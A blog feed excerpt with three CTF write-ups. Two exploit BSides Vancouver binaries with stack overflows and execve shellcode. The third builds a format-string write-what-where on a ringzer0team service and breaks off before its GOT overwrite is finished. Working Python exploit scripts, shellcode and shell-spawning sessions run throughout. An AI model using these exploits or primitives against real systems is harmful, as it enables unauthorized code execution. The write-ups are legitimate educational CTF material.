  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - WWW]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/"/>
    <updated>2015-03-18T20:36:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www</id>
    <content type="html"><![CDATA[<p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>

<!-- more -->


<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>

<pre><code class="bash">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>

<pre><code class="bash">gdb-peda$ r
Welcome to www! Please give me two strings to have them echoed back to you!
buffers at 0xffffd4c4 and 0xffffd3c4, ready for input!
AAAAAA
BBBBBB
AAAAAA

BBBBBB

Stack canary created: &gt;tC[hbw]
Better luck next time, eh?
</code></pre>

<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>

<pre><code>0804873c &lt;copybuf&gt;:
 804873c:   55                      push   ebp
 804873d:   89 e5                   mov    ebp,esp
 804873f:   83 ec 38                sub    esp,0x38
 8048742:   c7 44 24 08 09 00 00    mov    DWORD PTR [esp+0x8],0x9
 8048749:   00 
 804874a:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
 8048751:   08 
 8048752:   8d 45 eb                lea    eax,[ebp-0x15]
 8048755:   89 04 24                mov    DWORD PTR [esp],eax
 8048758:   e8 c3 fe ff ff          call   8048620 &lt;strncpy@plt&gt;
 804875d:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048760:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048764:   8d 45 db                lea    eax,[ebp-0x25]                ; first buffer is copied here
 8048767:   89 04 24                mov    DWORD PTR [esp],eax
 804876a:   e8 41 fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
 804876f:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]       ; ebp+0xc = second input
 8048772:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax          
 8048776:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]       ; overflow this pointer with exit@got
 8048779:   89 04 24                mov    DWORD PTR [esp],eax
 804877c:   e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
 ; check_cookie:
 8048781:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
 8048788:   08 
 8048789:   8d 45 eb                lea    eax,[ebp-0x15]
 804878c:   89 04 24                mov    DWORD PTR [esp],eax
 804878f:   e8 bc fd ff ff          call   8048550 &lt;strcmp@plt&gt;
 8048794:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 8048797:   83 7d f4 00             cmp    DWORD PTR [ebp-0xc],0x0
 804879b:   74 18                   je     80487b5 &lt;copybuf+0x79&gt;        ; if canary check fails, call exit@plt -&gt; overwrite
 804879d:   c7 04 24 30 8a 04 08    mov    DWORD PTR [esp],0x8048a30
 80487a4:   e8 17 fe ff ff          call   80485c0 &lt;puts@plt&gt;
 80487a9:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 80487b0:   e8 2b fe ff ff          call   80485e0 &lt;exit@plt&gt;
 ; cookie_OK:
 80487b5:   c9                      leave  
 80487b6:   c3                      ret    
</code></pre>

<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite one of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I chose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>

<p>Putting it all together:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re

def p(x):
    return struct.pack('&lt;L', x)

def pQ(x):
    return struct.pack('&lt;Q', x)

s=socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 17284))
s.connect(('www.termsec.net', 17284))

buf = s.recv(200)

m = re.findall('(0x[0-9a-f]+)', buf)
buf1_addr = int(m[0], 16)
buf2_addr = int(m[1], 16)

print "[~] buf1: 0x%lx" % buf1_addr
print "[~] buf2: 0x%lx" % buf2_addr

# first input will overwrite the pointer that is used for the second strcpy 
payload = ""
payload += "A"*45       # padding
payload += p(0x8049d10) # we'll overwrite exit@plt
payload += p(buf2_addr) # restore this on the stack, otherwise it will be partially overwritten

s.send(payload + "\n")

# second input, used in second strcpy. By now, that strcpy will call:
# strcpy(0x8049d10, buffer2)
payload = ""
payload += p(buf2_addr+4)   # overwrite exit@plt with the address where the shellcode starts
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

s.send(payload + "\n")
s.recv(200)

print "[!] enjoy your shell"

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/www-200$ python ./www.py
[~] buf1: 0xbfa660d4
[~] buf2: 0xbfa65fd4

[!] enjoy your shell
id
/bin//sh: 1: id: not found
cat flag.txt
flag{K33P_ST4T1C_L1K3_W00L_F4BR1C}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - Sushi]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/"/>
    <updated>2015-03-18T20:15:54+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi</id>
    <content type="html"><![CDATA[<p>At the very last minute, we decided to join BSides Vancouvers&#8217; CTF. Sushi was a 100 point pwnable.</p>

<!-- more -->


<p>We&rsquo;re given the binary (and the libraries are available if need be &ndash; really nice, no guessing). Upon running it, it gives us some address and asks for money:</p>

<pre><code class="bash">Deposit money for sushi here: 0x7ffc068ccfe0
aaaaaaaa
Sorry, $0.97 is not enough.
</code></pre>

<p>It seems to take the first character <code>a</code> (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in <code>gdb-peda</code>.</p>

<pre><code class="bash">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:</p>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "".join(["%04d" % x for x in range(200)])' | ./sushi
Deposit money for sushi here: 0x7ffd0aa1edb0
Sorry, $0.48 is not enough.
Segmentation fault (core dumped)
bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
...snip...
Core was generated by `./sushi'.
Program terminated with signal 11, Segmentation fault.
#0  0x00000000004005f2 in ?? ()
gdb-peda$ x/i $rip
=&gt; 0x4005f2:    ret    
gdb-peda$ x/2wx $rsp
0x7ffd0aa1edf8: 0x38313030  0x39313030
</code></pre>

<p>Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with <code>00180019</code>, so now I had the offset. The program crashes upon executing the <code>ret</code> statement at <code>0x4005f2</code> because the address does not point to a valid memory location.</p>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "A"*(18*4)+"BBBBCCCC"' | ./sushi
Deposit money for sushi here: 0x7ffdcfd360b0
Sorry, $0.65 is not enough.
Segmentation fault (core dumped)
bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
...snip...
Core was generated by `./sushi'.
Program terminated with signal 11, Segmentation fault.
#0  0x00000000004005f2 in ?? ()
gdb-peda$ x/2wx $rsp
0x7ffdcfd360f8: 0x42424242  0x43434343
gdb-peda$ x/s 0x7ffdcfd360b0
0x7ffdcfd360b0:  'A' &lt;repeats 72 times&gt;, "BBBBCCCC"
</code></pre>

<p>What&rsquo;s more, each time upon running <code>sushi</code>, the program supplies the address of the buffer it is using! In other words, that&rsquo;s a nice place for shellcode!</p>

<p>The program uses <code>gets()</code> to get the input:</p>

<pre><code class="bash">0x4005c5:  call  0x400480 &lt;gets@plt&gt;
</code></pre>

<p>This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a <code>socat</code> process:</p>

<pre><code class="bash">$ socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
</code></pre>

<p>Next was writing a simple exploit in python:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re

def p(x):
    return struct.pack('&lt;L', x)

def pQ(x):
    return struct.pack('&lt;Q', x)

s=socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('sushi.termsec.net', 4000))

buf = s.recv(1000)
stack_addr = int(re.search('(0x[0-9a-f]+)', buf).group(1), 16)

print "[~] stack addr: 0x%lx" % stack_addr

# simple x64 execve shellcode
shellcode = "\x31\xc0\48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
# payload must overflow saved return address on stack
payload = shellcode + "A" * (72 - len(shellcode))
# we're given the address of our (executable!) buffer on the stack, so use that as return address
payload += pQ(stack_addr) + "\n"

s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<p>It ran locally after a bit of fine-tuning, so the proof was in the pudding:</p>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python ./sushi.py 
[~] stack addr: 0x7fffb3fc0480
Sorry, $0.49 is not enough.
cat flag.txt
flag{I_l3ft_my_wallet_in_#irc}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/"/>
    <updated>2015-02-22T13:01:22+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution</id>
    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<pre><code class="c">    char *response = NULL;
    char *cleanBuffer = NULL;

    response = (char*)malloc(2048);
    memset(response, 0, 2048);

    cleanBuffer = (char*)malloc(strlen(buf));
    memset(cleanBuffer, 0, strlen(buf));

    strncpy(cleanBuffer, buf, strlen(buf) - 1);

    char test[] = "AAAABBBBCCCC";
    char flag[] = "XXXXXXXXXXXXXXXXXXXXXXXXXX";

    if(strcmp(flag, cleanBuffer) == 0) {
        strcpy(response, "Here's your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.\n");
    } else {
        sprintf(response, cleanBuffer); // &lt;-- we have a format string vulnerability here
        sprintf(response, "%s is a wrong password.\n\nPassword:", response);
    }
</code></pre>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%lx-%lx-%lx-%lx-%lx-%lx-
17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</code></pre>

<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<pre><code class="python">import struct
from socket import *

def grab(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = data.split()[0]

    print i, addr
    s.close()

for z in range(700):
    grab(z)
</code></pre>

<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<pre><code>...snip...
633 7fffeecd9c28
634 1c
635 2
636 7fff00000042
637 7fffeecdaf65
638 0
...snip...
</code></pre>

<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.
</code></pre>

<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.

Password:%66c%636$hhn                  
                                                                 � is a wrong password.

Password:%636$s
Bhome/crackme/fs_64 is a wrong password.
</code></pre>

<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

# this will write out 'BAS',0 to the scratch area!
# update the pointer
write_byte_value_via(5, 1)
# write a byte to the scratch area
write_byte_value_via(636, ord('B'))
# update the pointer
write_byte_value_via(5, 2)
# write a byte to the scratch area
write_byte_value_via(636, ord('A'))
write_byte_value_via(5, 3)
write_byte_value_via(636, ord('S'))
write_byte_value_via(5, 4)
# write out a NULL byte first writing out 256 bytes (which wraps to 0x00)
write_byte_value_via(636, 256)

# reset the pointer
write_byte_value_via(5, 1)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# CAN ADDRESS IT DIRECTLY!!
scratch_addr = grab_value_directly(636+format_offset)
print "scratch contains: ", hex(scratch_addr)
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit1.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f51
scratch contains:  0x534142
scratch is parameter 1601
scratch contains:  0x53414200
</code></pre>

<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)    # write byte

    dump1 = grab_value_indirectly(636+offset)
    return hex(dump1)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

print "read from 0x400000: {}".format(read_from_address(0x400000, format_offset))
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit3.py
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x7369
scratch is parameter 1601
read from 0x400000: 0x10102464c457f
</code></pre>

<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<pre><code class="bash">...snip...
00014a0: ffc7 8580 edff ff41 4141 41c7 8584 edff  .......AAAA.....
00014b0: 0042 4242 42c7 8588 edff ff43 4343 43c6  .BBBB......CCCC
...snip...
</code></pre>

<p>This looks familiar, doesn&rsquo;t it?</p>

<pre><code class="c">char test[] = "AAAABBBBCCCC";
</code></pre>

<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<pre><code class="bash">$ xxd -c 1 dump |grep 1260 -A512 | awk '{print $2}' |tr -d '\n'
b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
...snip...
</code></pre>

<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<pre><code class="bash">$ echo 'b800...' | rasm2 -d -b 64 -o 0x401260 -

mov dword [rbp-0x50], 0x0
mov eax, [rbp-0x20]
cmp eax, [rbp-0x1c]
jnz dword 0x4015d1
// char *response = NULL;
mov qword [rbp-0x58], 0x0       
// char *cleanBuffer = NULL;
mov qword [rbp-0x60], 0x0   
// response = (char*)malloc(2048);  
mov edi, 0x800                  
call dword 0x400ba0             
mov [rbp-0x58], rax
// memset(response, 0, 2048);
mov rax, [rbp-0x58]
mov edx, 0x800
mov esi, 0x0
mov rdi, rax
call dword 0x400b40
// cleanBuffer = (char*)malloc(strlen(buf));
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 
mov rdi, rax
call dword 0x400ba0
mov [rbp-0x60], rax
lea rax, [rbp-0x11f0]
</code></pre>

<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<pre><code>0000b00: ff25 fa0f 0000 6807 0000 00e9 70ff ffff  .%....h.....p...
</code></pre>

<p>This disassembles to</p>

<pre><code class="bash">$ rasm2 -d -b 64 -o 0x400b00 -
ff25fa0f0000
jmp qword [rip+0xffa]
</code></pre>

<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<pre><code>0000f70: 5348 83ec 1048 85ff 7416 8b05 4ca9 3400  SH...H..t...L.4.
0000f80: 85c0 7526 4883 c410 5be9 82fb ffff 6690  ..u&amp;H...[.....f.
</code></pre>

<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<pre><code>objdump -d -M intel libc-2.13.so |grep system -A10

000000000003fc70 &lt;__libc_system&gt;:
   3fc70:   53                      push   rbx
   3fc71:   48 83 ec 10             sub    rsp,0x10
   3fc75:   48 85 ff                test   rdi,rdi
   3fc78:   74 16                   je     3fc90 &lt;__libc_system+0x20&gt;
   3fc7a:   8b 05 6c b9 34 00       mov    eax,DWORD PTR [rip+0x34b96c]        # 38b5ec &lt;argp_program_version_hook+0x1b4&gt;
   3fc80:   85 c0                   test   eax,eax
   3fc82:   75 26                   jne    3fcaa &lt;__libc_system+0x3a&gt;
   3fc84:   48 83 c4 10             add    rsp,0x10
   3fc88:   5b                      pop    rbx
   3fc89:   e9 82 fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
   3fc8e:   66 90                   xchg   ax,ax
</code></pre>

<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// disassembly:
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 &lt; the GOT entry for strlen will be pointing to system!
</code></pre>

<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<pre><code class="python">def write_on_stack(what, where, offset):
    # write out all the bytes of what
    # used to write addresses on the stack
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
# from libc-2.13-38 -- NOT CORRECT
libc_base = strlen_addr - 0x80b70
print "[+] libc_base is at {}.".format(hex(libc_base))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
write_on_stack(0x601e20, 0, format_offset)
write_on_stack(0x601e21, 8, format_offset)
write_on_stack(0x601e22, 16, format_offset)

# ok, now try to set three bytes in one go
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

# should write out "BAS" in one go
payload = "%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)

s.recv(128)
s.send(payload)
data = s.recv(64)
s.close()

# read it back to check!
check = read_from_address(0x601e20, format_offset)
print hex(check)
</code></pre>

<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<pre><code>"%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)
</code></pre>

<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

<pre><code class="bash">$ python sploit7.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x601b
scratch is parameter 1601
[+] strlen is at 0x7f82b7326c40.
[+] libc_base is at 0x7f82b72a60d0.
[+] wrote 0x601e20 to 1601
[+] wrote 0x601e21 to 1602
[+] wrote 0x601e22 to 1603

0x534142
